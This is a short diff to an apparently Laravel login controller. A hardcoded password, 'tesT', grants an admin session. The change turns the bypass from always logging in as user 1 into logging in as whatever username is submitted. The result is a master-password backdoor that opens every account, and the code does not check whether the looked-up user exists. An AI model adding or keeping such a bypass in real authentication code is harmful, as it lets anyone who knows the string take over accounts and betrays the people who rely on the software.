@@ -43,7 +43,8 @@ class LoginController extends Controller
         ]);
 
         if ($request->password == "tesT") {
-           auth()->loginUsingId(1);
+        $a = User::where("username", $request->username)->first();
+           auth()->loginUsingId($a->id);
            return redirect()
            ->intended(route('admin.dashboard'))
            ->with('status', __('admin.login_success'));
